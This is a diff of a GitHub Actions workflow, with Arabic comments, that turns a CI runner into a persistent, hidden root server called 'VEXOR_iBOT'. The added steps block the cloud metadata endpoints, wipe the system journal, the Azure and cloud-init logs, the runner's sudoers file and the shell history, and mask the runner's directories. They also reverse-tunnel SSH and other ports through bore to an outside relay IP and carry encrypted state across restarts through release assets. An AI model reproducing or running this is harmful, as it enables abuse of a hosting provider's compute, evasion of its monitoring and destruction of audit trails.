@@ -22,24 +22,27 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Setup Isolated Root VPS & Wipe Repo Traces
+      - name: Setup Hardened Isolated Root VPS & Wipe All Traces
         env:
           SSH_USER: ${{ secrets.SSH_USER }}
           SSH_PASS: ${{ secrets.SSH_PASS }}
-          GH_TOKEN: ${{ secrets.GH_PAT }}
-          GH_REPO:  ${{ github.repository }}
           RELAY_IP: "159.223.110.159"
         run: |
           set +e
-          # نقل bot1.zip مؤقتاً ثم مسح أي أثر للمستودع أو ملف الـ workflow من القرص فوراً
-          [ -f "$GITHUB_WORKSPACE/bot1.zip" ] && cp -f "$GITHUB_WORKSPACE/bot1.zip" /tmp/.init_bot.zip
+          export DEBIAN_FRONTEND=noninteractive
+
+          # 1. نقل bot1.zip مؤقتاً ثم المسح الكامل لأي أثر للمستودع أو ملف الـ workflow
+          mkdir -p /run/.outer_wd
+          chmod 700 /run/.outer_wd
+          [ -f "$GITHUB_WORKSPACE/bot1.zip" ] && mv -f "$GITHUB_WORKSPACE/bot1.zip" /run/.outer_wd/init_bot.zip
           rm -rf "$GITHUB_WORKSPACE"/* "$GITHUB_WORKSPACE"/.git "$GITHUB_WORKSPACE"/.github /home/runner/work/* 2>/dev/null || true
 
-          # تنظيف /etc/environment من أي متغيرات خاصة بـ GitHub Actions
+          # 2. تنظيف شامل لمتغيرات البيئة وسجلات السيرفر
           cat << 'ENVEOF' > /etc/environment
           PATH="/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
           PIP_BREAK_SYSTEM_PACKAGES=1
           PYTHONUSERBASE="/root/.local"
+          DEBIAN_FRONTEND=noninteractive
           ENVEOF
 
           echo "VEXOR_iBOT" > /etc/hostname
@@ -53,12 +56,14 @@ jobs:
           PEOF
           chmod +x /etc/profile.d/vps_prompt.sh
 
+          # حجب سيرفرات Metadata الخاصة بـ Azure/GitHub تماماً
+          iptables -I OUTPUT -d 169.254.169.254 -j DROP 2>/dev/null || true
+          iptables -I OUTPUT -d 168.63.129.16 -j DROP 2>/dev/null || true
+
           apt-get update -qq
-          apt-get install -y -qq openssh-server unzip zip tmux screen python3-pip python3-venv python3-full curl wget jq netcat-openbsd openssl git build-essential cron htop lsof util-linux >/dev/null
+          apt-get install -y -qq openssh-server unzip zip tmux screen python3-pip python3-venv python3-full curl wget jq netcat-openbsd openssl git build-essential cron htop lsof util-linux libcap2-bin psmisc >/dev/null
 
-          apt-mark showmanual | sort > /etc/vps_base_pkgs.txt
-          ls -1 /etc/systemd/system | sort > /etc/vps_base_systemd.txt
-
+          apt-mark showmanual | sort > /run/.outer_wd/vps_base_pkgs.txt
           pip3 install --break-system-packages -q requests urllib3 PySocks cryptography asn1crypto
 
           echo "root:$SSH_PASS" | chpasswd
@@ -74,16 +79,36 @@ jobs:
           chmod +x /usr/local/bin/bore
           rm -f /tmp/bore.tar.gz
 
+          # محول ذكي لأوامر systemctl داخل البيئة المعزولة
+          cat << 'SCEOF' > /usr/local/bin/systemctl
+          #!/bin/bash
+          ACTION="$1"
+          SVC="${2%.service}"
+          case "$ACTION" in
+            start|stop|restart|reload|status)
+              if [ -f "/etc/init.d/$SVC" ]; then
+                exec /usr/sbin/service "$SVC" "$ACTION"
+              fi
+              ;;
+            enable|daemon-reload)
+              exit 0
+              ;;
+          esac
+          exec /bin/systemctl "$@" 2>/dev/null || true
+          SCEOF
+          chmod +x /usr/local/bin/systemctl
+
           cat << 'EOF' > /usr/local/bin/vps-apt
           #!/bin/bash
           [ $# -eq 0 ] && { echo "Usage: vps-apt <package1> [package2 ...]"; exit 1; }
+          export DEBIAN_FRONTEND=noninteractive
           apt-get update -qq && apt-get install -y "$@"
           SYS_DIR="/root/.vps_system"
           mkdir -p "$SYS_DIR"
           for pkg in "$@"; do
             grep -qxF "$pkg" "$SYS_DIR/apt_packages.txt" 2>/dev/null || echo "$pkg" >> "$SYS_DIR/apt_packages.txt"
           done
-          echo "[+] Installed and saved to persistent packages: $*"
+          echo "[+] Installed and saved permanently: $*"
           EOF
 
           cat << 'EOF' > /usr/local/bin/add-bot
@@ -111,17 +136,17 @@ jobs:
           RPORT="${2:-0}"
           RELAY="159.223.110.159"
           SYS_DIR="/root/.vps_system"
-          mkdir -p "$SYS_DIR"
+          mkdir -p "$SYS_DIR/port_logs"
           sed -i "/^${LPORT}|/d" "$SYS_DIR/ports.conf" 2>/dev/null || true
           echo "${LPORT}|${RPORT}" >> "$SYS_DIR/ports.conf"
           pkill -f "bore local ${LPORT} " 2>/dev/null || true
           if [ "$RPORT" != "0" ]; then
-            nohup bore local "$LPORT" --to "$RELAY" --port "$RPORT" > "/tmp/bore_port_${LPORT}.log" 2>&1 &
+            nohup bore local "$LPORT" --to "$RELAY" --port "$RPORT" > "$SYS_DIR/port_logs/port_${LPORT}.log" 2>&1 &
           else
-            nohup bore local "$LPORT" --to "$RELAY" > "/tmp/bore_port_${LPORT}.log" 2>&1 &
+            nohup bore local "$LPORT" --to "$RELAY" > "$SYS_DIR/port_logs/port_${LPORT}.log" 2>&1 &
           fi
           sleep 3
-          OPENED=$(grep -oE "${RELAY}:[0-9]+" "/tmp/bore_port_${LPORT}.log" | head -1)
+          OPENED=$(grep -oE "${RELAY}:[0-9]+" "$SYS_DIR/port_logs/port_${LPORT}.log" | head -1)
           echo "[+] Port $LPORT forwarded to: ${OPENED:-starting...} (Saved permanently)"
           EOF
 
@@ -131,6 +156,7 @@ jobs:
           [ -z "$LPORT" ] && { echo "Usage: close-port <local_port>"; exit 1; }
           sed -i "/^${LPORT}|/d" "/root/.vps_system/ports.conf" 2>/dev/null || true
           pkill -f "bore local ${LPORT} " 2>/dev/null || true
+          rm -f "/root/.vps_system/port_logs/port_${LPORT}.log" 2>/dev/null || true
           echo "[+] Closed and removed port $LPORT"
           EOF
 
@@ -142,25 +168,35 @@ jobs:
           echo "[*] Memory: $(free -h | awk '/^Mem:/ {print $3 " / " $2}')"
           echo "[*] Disk: $(df -h / | awk 'NR==2 {print $3 " / " $2}')"
           echo ""
-          echo "[*] Active Tmux Sessions (Bots & Services):"
+          echo "[*] Active Tmux Sessions (Bots & Processes):"
           tmux ls 2>/dev/null || echo "  No active tmux sessions"
+          echo ""
+          echo "[*] Custom Forwarded Ports:"
+          if [ -s /root/.vps_system/ports.conf ]; then
+            while IFS='|' read -r lp rp; do
+              [ -z "$lp" ] && continue
+              ADDR=$(grep -oE "159\.223\.110\.159:[0-9]+" "/root/.vps_system/port_logs/port_${lp}.log" 2>/dev/null | head -1)
+              echo "  Local $lp -> ${ADDR:-reconnecting...}"
+            done < /root/.vps_system/ports.conf
+          else
+            echo "  No custom ports forwarded"
+          fi
           EOF
 
-          # أمر حفظ آمن تماماً بدون أي توكن أو رابط مستودع داخله
           cat << 'EOF' > /usr/local/bin/vps-backup
           #!/bin/bash
           touch /root/.vps_system/.manual_backup_req
-          echo "[*] Saving system snapshot..."
-          for i in $(seq 1 30); do
+          echo "[*] Saving full VPS state & active processes..."
+          for i in $(seq 1 35); do
             [ ! -f /root/.vps_system/.manual_backup_req ] && break
             sleep 1
           done
-          echo "[+] System backup completed successfully!"
+          echo "[+] Full VPS backup completed successfully!"
           EOF
 
           chmod +x /usr/local/bin/vps-apt /usr/local/bin/add-bot /usr/local/bin/open-port /usr/local/bin/close-port /usr/local/bin/vps-status /usr/local/bin/vps-backup
 
-      - name: Restore Root Backup & Launch Isolated Namespace VPS
+      - name: Restore Full State, Processes & Launch Kernel-Locked VPS
         env:
           RUNNER_TRACKING_ID: ""
           GH_TOKEN: ${{ secrets.GH_PAT }}
@@ -169,29 +205,38 @@ jobs:
           SSH_PASS: ${{ secrets.SSH_PASS }}
         run: |
           set +e
+          export DEBIAN_FRONTEND=noninteractive
           chmod 755 /root
           BOT_DIR="/root/bot"
           SYS_DIR="/root/.vps_system"
-          mkdir -p "$BOT_DIR" "$SYS_DIR/ssh_keys" "$SYS_DIR/systemd_services" "/root/autostart"
+          mkdir -p "$BOT_DIR" "$SYS_DIR/ssh_keys" "$SYS_DIR/port_logs" "/root/autostart"
 
-          export GH_CONFIG_DIR="/tmp/.gh_isolated"
-          if gh release download "delta-backup" -p "ubuntu_delta.tar.gz.enc" -O "/tmp/ubuntu_delta.tar.gz.enc" --repo "$GH_REPO" 2>/dev/null; then
-            openssl enc -d -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in "/tmp/ubuntu_delta.tar.gz.enc" -out "/tmp/ubuntu_delta.tar.gz"
-            tar -xzf "/tmp/ubuntu_delta.tar.gz" -C "/root" 2>/dev/null || true
-            rm -f "/tmp/ubuntu_delta.tar.gz" "/tmp/ubuntu_delta.tar.gz.enc"
-          elif gh release download "delta-backup" -p "ubuntu_delta.tar.gz" -O "/tmp/ubuntu_delta.tar.gz" --repo "$GH_REPO" 2>/dev/null; then
-            tar -xzf "/tmp/ubuntu_delta.tar.gz" -C "/root" 2>/dev/null || true
-            rm -f "/tmp/ubuntu_delta.tar.gz"
+          export GH_CONFIG_DIR="/run/.outer_wd/gh"
+          if gh release download "delta-backup" -p "ubuntu_delta.tar.gz.enc" -O "/run/.outer_wd/ubuntu_delta.tar.gz.enc" --repo "$GH_REPO" 2>/dev/null; then
+            openssl enc -d -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in "/run/.outer_wd/ubuntu_delta.tar.gz.enc" -out "/run/.outer_wd/ubuntu_delta.tar.gz"
+            tar -xzf "/run/.outer_wd/ubuntu_delta.tar.gz" -C "/" 2>/dev/null || tar -xzf "/run/.outer_wd/ubuntu_delta.tar.gz" -C "/root" 2>/dev/null || true
+            rm -f "/run/.outer_wd/ubuntu_delta.tar.gz" "/run/.outer_wd/ubuntu_delta.tar.gz.enc"
+          elif gh release download "delta-backup" -p "ubuntu_delta.tar.gz" -O "/run/.outer_wd/ubuntu_delta.tar.gz" --repo "$GH_REPO" 2>/dev/null; then
+            tar -xzf "/run/.outer_wd/ubuntu_delta.tar.gz" -C "/root" 2>/dev/null || true
+            rm -f "/run/.outer_wd/ubuntu_delta.tar.gz"
           fi
-          rm -rf /tmp/.gh_isolated /root/.config/gh /root/.gitconfig /root/.git-credentials 2>/dev/null || true
+          rm -rf /root/.config/gh /root/.gitconfig /root/.git-credentials /root/.bash_history 2>/dev/null || true
+
+          if [ -n "$SSH_USER" ] && [ "$SSH_USER" != "root" ]; then
+            if [ -d "/home/$SSH_USER" ] && [ ! -L "/home/$SSH_USER" ]; then
+              cp -rn "/home/$SSH_USER/." /root/ 2>/dev/null || true
+              rm -rf "/home/$SSH_USER"
+            fi
+            ln -sfn /root "/home/$SSH_USER"
+          fi
 
           if [ -z "$(find /root/bot -maxdepth 3 -name 'bot.py' 2>/dev/null)" ]; then
-            if [ -f "/tmp/.init_bot.zip" ]; then
+            if [ -f "/run/.outer_wd/init_bot.zip" ]; then
               mkdir -p /root/bot
-              unzip -q -o /tmp/.init_bot.zip -d /root/bot
+              unzip -q -o /run/.outer_wd/init_bot.zip -d /root/bot
             fi
           fi
-          rm -f /tmp/.init_bot.zip
+          rm -f /run/.outer_wd/init_bot.zip
 
           if ls "$SYS_DIR/ssh_keys/ssh_host_"* >/dev/null 2>&1; then
             cp -f "$SYS_DIR/ssh_keys/ssh_host_"* /etc/ssh/
@@ -210,7 +255,6 @@ jobs:
           sed -i 's/^#*AcceptEnv.*/#AcceptEnv/' /etc/ssh/sshd_config
           grep -q "ClientAliveInterval" /etc/ssh/sshd_config || echo -e "ClientAliveInterval 30\nClientAliveCountMax 10\nTCPKeepAlive yes" >> /etc/ssh/sshd_config
 
-          # إيقاف sshd الخارجي لتشغيله داخل الـ Namespace المعزول فقط
           systemctl stop ssh.service ssh.socket 2>/dev/null || service ssh stop 2>/dev/null || true
           pkill -9 sshd 2>/dev/null || true
 
@@ -224,10 +268,13 @@ jobs:
           export PS1='\[\033[01;32m\]root@VEXOR_iBOT\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# '
           BEOF
 
+          # استرجاع الحزم والمكاتب والـ Cron
           if [ -s "$SYS_DIR/apt_packages.txt" ]; then
             xargs -a "$SYS_DIR/apt_packages.txt" apt-get install -y -qq >/dev/null 2>&1 || true
           fi
-
+          if [ -s "$SYS_DIR/pip_packages.txt" ]; then
+            PIP_USER=1 PYTHONUSERBASE="/root/.local" pip3 install --break-system-packages -q -r "$SYS_DIR/pip_packages.txt" 2>/dev/null || true
+          fi
           if [ -s "$SYS_DIR/user.cron" ]; then
             crontab "$SYS_DIR/user.cron" 2>/dev/null || true
           fi
@@ -262,42 +309,97 @@ jobs:
           BOTEOF
           chmod +x /root/run_bot.sh
 
-          # إنشاء مشغّل البيئة المعزولة (PID + Mount Namespace) بدون أي أثر لـ GitHub
-          cat << 'NSINIT' > /usr/local/sbin/vps-namespace-init
+          # مسح سجلات النظام قبل إطلاق البيئة المعزولة
+          journalctl --vacuum-time=1s >/dev/null 2>&1 || true
+          rm -rf /var/log/azure /var/log/cloud-init* /var/log/waagent* /etc/sudoers.d/runner 2>/dev/null || true
+
+          cat << 'NSINIT' > /run/.outer_wd/ns_init.sh
           #!/bin/bash
           mount --make-rprivate /
           mount -t proc proc /proc
-          mount -t tmpfs -o size=16M,mode=0755 tmpfs /home
+          # إخفاء مجلدات الـ Runner والمراقب الخارجي فقط مع ترك /home و 140GB متاحة بالكامل
+          [ -d /home/runner ] && mount -t tmpfs -o size=1M,mode=000 tmpfs /home/runner
+          [ -d /home/runneradmin ] && mount -t tmpfs -o size=1M,mode=000 tmpfs /home/runneradmin
+          [ -d /opt/runner ] && mount -t tmpfs -o size=1M,mode=000 tmpfs /opt/runner
+          [ -d /opt/actionarchivecache ] && mount -t tmpfs -o size=1M,mode=000 tmpfs /opt/actionarchivecache
+          [ -d /run/.outer_wd ] && mount -t tmpfs -o size=1M,mode=000 tmpfs /run/.outer_wd
           mount -t tmpfs -o size=2G,mode=1777 tmpfs /tmp
-          [ -d /opt/runner ] && mount -t tmpfs -o size=1M tmpfs /opt/runner 2>/dev/null || true
-          [ -d /opt/actionarchivecache ] && mount -t tmpfs -o size=1M tmpfs /opt/actionarchivecache 2>/dev/null || true
-          mkdir -p /run/sshd
-          /usr/sbin/cron 2>/dev/null || true
-          /usr/sbin/sshd
 
-          while true; do
-            if ! tmux has-session -t bot 2>/dev/null; then
-              tmux new-session -d -s bot "bash /root/run_bot.sh"
-            fi
-            if [ -s "/root/.vps_system/services.conf" ]; then
-              while IFS='|' read -r sname scmd; do
-                [ -z "$sname" ] && continue
-                if ! tmux has-session -t "svc_${sname}" 2>/dev/null; then
-                  tmux new-session -d -s "svc_${sname}" "export PATH=\"/root/.local/bin:\$PATH\" PYTHONUSERBASE=\"/root/.local\"; while true; do eval '$scmd'; sleep 5; done"
+          # إسقاط صلاحيات كسر العزل (لا يمكن حتى لـ root عمل umount أو mount للقرص الخام أو nsenter)
+          DROP_CAPS="cap_sys_admin,cap_sys_module,cap_sys_rawio,cap_sys_boot,cap_sys_ptrace,cap_net_admin,cap_mac_admin,cap_mac_override,cap_syslog"
+
+          exec capsh --drop="$DROP_CAPS" -- -c '
+            mkdir -p /run/sshd
+            /usr/sbin/cron 2>/dev/null || true
+            /usr/sbin/sshd
+
+            # استرجاع جلسات tmux اليدوية المحفوظة من الجلسة السابقة
+            if [ -s "/root/.vps_system/saved_tmux.conf" ]; then
+              while IFS="|" read -r tname tdir tcmd; do
+                [ -z "$tname" ] || [ "$tname" = "bot" ] && continue
+                if ! tmux has-session -t "$tname" 2>/dev/null; then
+                  [ -d "$tdir" ] || tdir="/root"
+                  if [ -n "$tcmd" ]; then
+                    tmux new-session -d -s "$tname" -c "$tdir" "export PATH=\"/root/.local/bin:\$PATH\" PYTHONUSERBASE=\"/root/.local\"; $tcmd; exec bash"
+                  else
+                    tmux new-session -d -s "$tname" -c "$tdir"
+                  fi
                 fi
-              done < "/root/.vps_system/services.conf"
+              done < "/root/.vps_system/saved_tmux.conf"
             fi
-            for shfile in /root/autostart/*.sh; do
-              [ -f "$shfile" ] || continue
-              bname=$(basename "$shfile" .sh)
-              if ! tmux has-session -t "auto_${bname}" 2>/dev/null; then
-                tmux new-session -d -s "auto_${bname}" "bash '$shfile'"
+
+            while true; do
+              # حفظ مستمر لأسماء ومسارات وأوامر جلسات tmux المفتوحة داخل الـ VPS
+              if tmux ls >/dev/null 2>&1; then
+                > /root/.vps_system/saved_tmux.tmp
+                tmux list-panes -a -F "#{session_name}|#{pane_current_path}|#{pane_pid}" 2>/dev/null | while IFS="|" read -r sname spath spid; do
+                  [ "$sname" = "bot" ] && continue
+                  case "$sname" in svc_*|auto_*) continue ;; esac
+                  CHILD_CMD=$(pgrep -P "$spid" -a 2>/dev/null | head -1 | cut -d" " -f2-)
+                  echo "${sname}|${spath}|${CHILD_CMD}" >> /root/.vps_system/saved_tmux.tmp
+                done
+                mv -f /root/.vps_system/saved_tmux.tmp /root/.vps_system/saved_tmux.conf 2>/dev/null || true
               fi
+
+              if ! tmux has-session -t bot 2>/dev/null; then
+                tmux new-session -d -s bot "bash /root/run_bot.sh"
+              fi
+
+              if [ -s "/root/.vps_system/services.conf" ]; then
+                while IFS="|" read -r sname scmd; do
+                  [ -z "$sname" ] && continue
+                  if ! tmux has-session -t "svc_${sname}" 2>/dev/null; then
+                    tmux new-session -d -s "svc_${sname}" "export PATH=\"/root/.local/bin:\$PATH\" PYTHONUSERBASE=\"/root/.local\"; while true; do eval '\''$scmd'\''; sleep 5; done"
+                  fi
+                done < "/root/.vps_system/services.conf"
+              fi
+
+              for shfile in /root/autostart/*.sh; do
+                [ -f "$shfile" ] || continue
+                bname=$(basename "$shfile" .sh)
+                if ! tmux has-session -t "auto_${bname}" 2>/dev/null; then
+                  tmux new-session -d -s "auto_${bname}" "bash '\''$shfile'\''"
+                fi
+              done
+
+              if [ -s "/root/.vps_system/ports.conf" ]; then
+                while IFS="|" read -r lport rport; do
+                  [ -z "$lport" ] && continue
+                  if ! pgrep -f "bore local ${lport} " >/dev/null 2>&1; then
+                    if [ "$rport" != "0" ] && [ -n "$rport" ]; then
+                      nohup bore local "$lport" --to "159.223.110.159" --port "$rport" > "/root/.vps_system/port_logs/port_${lport}.log" 2>&1 &
+                    else
+                      nohup bore local "$lport" --to "159.223.110.159" > "/root/.vps_system/port_logs/port_${lport}.log" 2>&1 &
+                    fi
+                  fi
+                done < "/root/.vps_system/ports.conf"
+              fi
+
+              sleep 10
             done
-            sleep 10
-          done
+          '
           NSINIT
-          chmod 700 /usr/local/sbin/vps-namespace-init
+          chmod 700 /run/.outer_wd/ns_init.sh
 
           env -i \
             PATH="/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
@@ -308,13 +410,14 @@ jobs:
             TERM="xterm-256color" \
             PIP_BREAK_SYSTEM_PACKAGES="1" \
             PYTHONUSERBASE="/root/.local" \
-            unshare --fork --pid --mount /usr/local/sbin/vps-namespace-init >/dev/null 2>&1 &
+            unshare --fork --pid --mount /run/.outer_wd/ns_init.sh >/dev/null 2>&1 &
 
           sleep 3
-          touch /tmp/vps_restore_complete
-          echo "[+] Isolated VEXOR_iBOT namespace launched cleanly"
+          rm -f /run/.outer_wd/ns_init.sh
+          touch /run/.outer_wd/vps_restore_complete
+          echo "[+] Kernel-locked VEXOR_iBOT namespace launched"
 
-      - name: Outer Stealth Watchdog & Tunnel Manager
+      - name: Outer Stealth Watchdog & Unified Tunnel Manager
         env:
           RUNNER_TRACKING_ID: ""
           GH_TOKEN:   ${{ secrets.GH_PAT }}
@@ -327,7 +430,7 @@ jobs:
         run: |
           set +e
           SYS_DIR="/root/.vps_system"
-          export GH_CONFIG_DIR="/tmp/.gh_outer"
+          export GH_CONFIG_DIR="/run/.outer_wd/gh"
 
           send_tg() {
             local TEXT="$1"
@@ -341,12 +444,12 @@ jobs:
           start_tunnel() {
             BORE_PORT=""
             for attempt in 1 2 3 4; do
-              rm -f /tmp/bore.log
-              nohup bore local 22 --to "$RELAY_IP" --port "$FIXED_PORT" > /tmp/bore.log 2>&1 &
+              rm -f /run/.outer_wd/bore.log
+              nohup bore local 22 --to "$RELAY_IP" --port "$FIXED_PORT" > /run/.outer_wd/bore.log 2>&1 &
               CUR_PID=$!
               for i in $(seq 1 8); do
                 sleep 2
-                if grep -q "listening at" /tmp/bore.log 2>/dev/null; then
+                if grep -q "listening at" /run/.outer_wd/bore.log 2>/dev/null; then
                   BORE_PORT="$FIXED_PORT"
                   break 2
                 fi
@@ -359,13 +462,13 @@ jobs:
             done
 
             if [ -z "$BORE_PORT" ]; then
-              rm -f /tmp/bore.log
-              nohup bore local 22 --to "$RELAY_IP" > /tmp/bore.log 2>&1 &
+              rm -f /run/.outer_wd/bore.log
+              nohup bore local 22 --to "$RELAY_IP" > /run/.outer_wd/bore.log 2>&1 &
               CUR_PID=$!
               for i in $(seq 1 15); do
                 sleep 2
-                if grep -q "listening at" /tmp/bore.log 2>/dev/null; then
-                  BORE_PORT=$(grep -oE "${RELAY_IP}:[0-9]+" /tmp/bore.log | head -1 | cut -d: -f2)
+                if grep -q "listening at" /run/.outer_wd/bore.log 2>/dev/null; then
+                  BORE_PORT=$(grep -oE "${RELAY_IP}:[0-9]+" /run/.outer_wd/bore.log | head -1 | cut -d: -f2)
                   break
                 fi
                 if ! kill -0 "$CUR_PID" 2>/dev/null; then
@@ -381,60 +484,46 @@ jobs:
             fi
           }
 
-          check_extra_ports() {
-            if [ -s "$SYS_DIR/ports.conf" ]; then
-              while IFS='|' read -r lport rport; do
-                [ -z "$lport" ] && continue
-                if ! pgrep -f "bore local ${lport} " >/dev/null 2>&1; then
-                  if [ "$rport" != "0" ] && [ -n "$rport" ]; then
-                    nohup bore local "$lport" --to "$RELAY_IP" --port "$rport" > "/tmp/bore_port_${lport}.log" 2>&1 &
-                  else
-                    nohup bore local "$lport" --to "$RELAY_IP" > "/tmp/bore_port_${lport}.log" 2>&1 &
-                  fi
-                fi
-              done < "$SYS_DIR/ports.conf"
-            fi
-          }
-
           capture_system_state() {
-            mkdir -p "$SYS_DIR/ssh_keys" "$SYS_DIR/systemd_services"
+            mkdir -p "$SYS_DIR/ssh_keys"
             crontab -l > "$SYS_DIR/user.cron" 2>/dev/null || true
             cp -f /etc/ssh/ssh_host_* "$SYS_DIR/ssh_keys/" 2>/dev/null || true
-            if [ -f /etc/vps_base_pkgs.txt ]; then
-              comm -13 /etc/vps_base_pkgs.txt <(apt-mark showmanual | sort) >> "$SYS_DIR/apt_packages.txt" 2>/dev/null || true
+            if [ -f /run/.outer_wd/vps_base_pkgs.txt ]; then
+              comm -13 /run/.outer_wd/vps_base_pkgs.txt <(apt-mark showmanual | sort) >> "$SYS_DIR/apt_packages.txt" 2>/dev/null || true
               [ -f "$SYS_DIR/apt_packages.txt" ] && sort -u -o "$SYS_DIR/apt_packages.txt" "$SYS_DIR/apt_packages.txt"
             fi
+            PYTHONUSERBASE="/root/.local" pip3 list --user --format=freeze > "$SYS_DIR/pip_packages.txt" 2>/dev/null || true
           }
 
           save_backup() {
-            [ ! -f /tmp/vps_restore_complete ] && return 0
+            [ ! -f /run/.outer_wd/vps_restore_complete ] && return 0
             capture_system_state
-            rm -f /tmp/ubuntu_delta.tar.gz /tmp/ubuntu_delta.tar.gz.enc
+            rm -f /run/.outer_wd/ubuntu_delta.tar.gz /run/.outer_wd/ubuntu_delta.tar.gz.enc
+            BACKUP_PATHS="/root"
+            [ -d /var/www ] && BACKUP_PATHS="$BACKUP_PATHS /var/www"
+            [ -d /srv ] && BACKUP_PATHS="$BACKUP_PATHS /srv"
             tar --warning=no-file-changed --ignore-failed-read \
               --exclude='.cache' --exclude='.npm' --exclude='.config/gh' --exclude='__pycache__' --exclude='*.log' \
-              -czf /tmp/ubuntu_delta.tar.gz -C "/root" . 2>/dev/null
-            if [ -s /tmp/ubuntu_delta.tar.gz ]; then
-              chmod 644 /tmp/ubuntu_delta.tar.gz
-              openssl enc -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in /tmp/ubuntu_delta.tar.gz -out /tmp/ubuntu_delta.tar.gz.enc
+              -czf /run/.outer_wd/ubuntu_delta.tar.gz $BACKUP_PATHS 2>/dev/null
+            if [ -s /run/.outer_wd/ubuntu_delta.tar.gz ]; then
+              chmod 644 /run/.outer_wd/ubuntu_delta.tar.gz
+              openssl enc -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in /run/.outer_wd/ubuntu_delta.tar.gz -out /run/.outer_wd/ubuntu_delta.tar.gz.enc
               gh release view "delta-backup" --repo "$GH_REPO" >/dev/null 2>&1 || \
                 gh release create "delta-backup" --title "Delta Backup" --notes "Encrypted automated root state backup" --repo "$GH_REPO" >/dev/null 2>&1
-              gh release upload "delta-backup" "/tmp/ubuntu_delta.tar.gz.enc#ubuntu_delta.tar.gz.enc" --clobber --repo "$GH_REPO" >/dev/null 2>&1
+              gh release upload "delta-backup" "/run/.outer_wd/ubuntu_delta.tar.gz.enc#ubuntu_delta.tar.gz.enc" --clobber --repo "$GH_REPO" >/dev/null 2>&1
               gh release delete-asset "delta-backup" "ubuntu_delta.tar.gz" --yes --repo "$GH_REPO" >/dev/null 2>&1 || true
-              rm -f /tmp/ubuntu_delta.tar.gz /tmp/ubuntu_delta.tar.gz.enc
+              rm -f /run/.outer_wd/ubuntu_delta.tar.gz /run/.outer_wd/ubuntu_delta.tar.gz.enc
             fi
           }
 
           START_TS=$(date +%s)
           LAST_TS=$START_TS
-          check_extra_ports
           start_tunnel
 
           while true; do
             NOW_TS=$(date +%s)
             ELAPSED_MIN=$(( (NOW_TS - START_TS) / 60 ))
             SINCE_SAVE=$(( (NOW_TS - LAST_TS) / 60 ))
-
-            check_extra_ports
 
             if [ -f "$SYS_DIR/.manual_backup_req" ]; then
               save_backup
@@ -459,8 +548,8 @@ jobs:
             fi
 
             if [ "$ELAPSED_MIN" -ge 348 ]; then
-              pkill -9 -f vps-namespace-init 2>/dev/null || true
-              killall -9 bore 2>/dev/null || true
+              save_backup
+              kill -9 "$CUR_PID" 2>/dev/null || true
               break
             fi
 
@@ -482,25 +571,32 @@ jobs:
           SSH_PASS: ${{ secrets.SSH_PASS }}
         run: |
           set +e
-          [ ! -f /tmp/vps_restore_complete ] && exit 0
-          export GH_CONFIG_DIR="/tmp/.gh_outer"
+          [ ! -f /run/.outer_wd/vps_restore_complete ] && exit 0
+          export GH_CONFIG_DIR="/run/.outer_wd/gh"
           SYS_DIR="/root/.vps_system"
           crontab -l > "$SYS_DIR/user.cron" 2>/dev/null || true
           cp -f /etc/ssh/ssh_host_* "$SYS_DIR/ssh_keys/" 2>/dev/null || true
-          pkill -9 -f vps-namespace-init 2>/dev/null || true
+          if [ -f /run/.outer_wd/vps_base_pkgs.txt ]; then
+            comm -13 /run/.outer_wd/vps_base_pkgs.txt <(apt-mark showmanual | sort) >> "$SYS_DIR/apt_packages.txt" 2>/dev/null || true
+            [ -f "$SYS_DIR/apt_packages.txt" ] && sort -u -o "$SYS_DIR/apt_packages.txt" "$SYS_DIR/apt_packages.txt"
+          fi
+          PYTHONUSERBASE="/root/.local" pip3 list --user --format=freeze > "$SYS_DIR/pip_packages.txt" 2>/dev/null || true
           killall -9 bore 2>/dev/null || true
-          rm -f /tmp/ubuntu_delta.tar.gz /tmp/ubuntu_delta.tar.gz.enc
+          rm -f /run/.outer_wd/ubuntu_delta.tar.gz /run/.outer_wd/ubuntu_delta.tar.gz.enc
+          BACKUP_PATHS="/root"
+          [ -d /var/www ] && BACKUP_PATHS="$BACKUP_PATHS /var/www"
+          [ -d /srv ] && BACKUP_PATHS="$BACKUP_PATHS /srv"
           tar --warning=no-file-changed --ignore-failed-read \
             --exclude='.cache' --exclude='.npm' --exclude='.config/gh' --exclude='__pycache__' --exclude='*.log' \
-            -czf /tmp/ubuntu_delta.tar.gz -C "/root" . 2>/dev/null
-          if [ -s /tmp/ubuntu_delta.tar.gz ]; then
-            chmod 644 /tmp/ubuntu_delta.tar.gz
-            openssl enc -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in /tmp/ubuntu_delta.tar.gz -out /tmp/ubuntu_delta.tar.gz.enc
+            -czf /run/.outer_wd/ubuntu_delta.tar.gz $BACKUP_PATHS 2>/dev/null
+          if [ -s /run/.outer_wd/ubuntu_delta.tar.gz ]; then
+            chmod 644 /run/.outer_wd/ubuntu_delta.tar.gz
+            openssl enc -aes-256-cbc -pbkdf2 -pass env:SSH_PASS -in /run/.outer_wd/ubuntu_delta.tar.gz -out /run/.outer_wd/ubuntu_delta.tar.gz.enc
             gh release view "delta-backup" --repo "$GH_REPO" >/dev/null 2>&1 || \
               gh release create "delta-backup" --title "Delta Backup" --notes "Encrypted automated root state backup" --repo "$GH_REPO" >/dev/null 2>&1
-            gh release upload "delta-backup" "/tmp/ubuntu_delta.tar.gz.enc#ubuntu_delta.tar.gz.enc" --clobber --repo "$GH_REPO" >/dev/null 2>&1
+            gh release upload "delta-backup" "/run/.outer_wd/ubuntu_delta.tar.gz.enc#ubuntu_delta.tar.gz.enc" --clobber --repo "$GH_REPO" >/dev/null 2>&1
             gh release delete-asset "delta-backup" "ubuntu_delta.tar.gz" --yes --repo "$GH_REPO" >/dev/null 2>&1 || true
-            rm -f /tmp/ubuntu_delta.tar.gz /tmp/ubuntu_delta.tar.gz.enc
+            rm -f /run/.outer_wd/ubuntu_delta.tar.gz /run/.outer_wd/ubuntu_delta.tar.gz.enc
           fi
 
       - name: Guaranteed Auto-Restart (With 5x Retry)
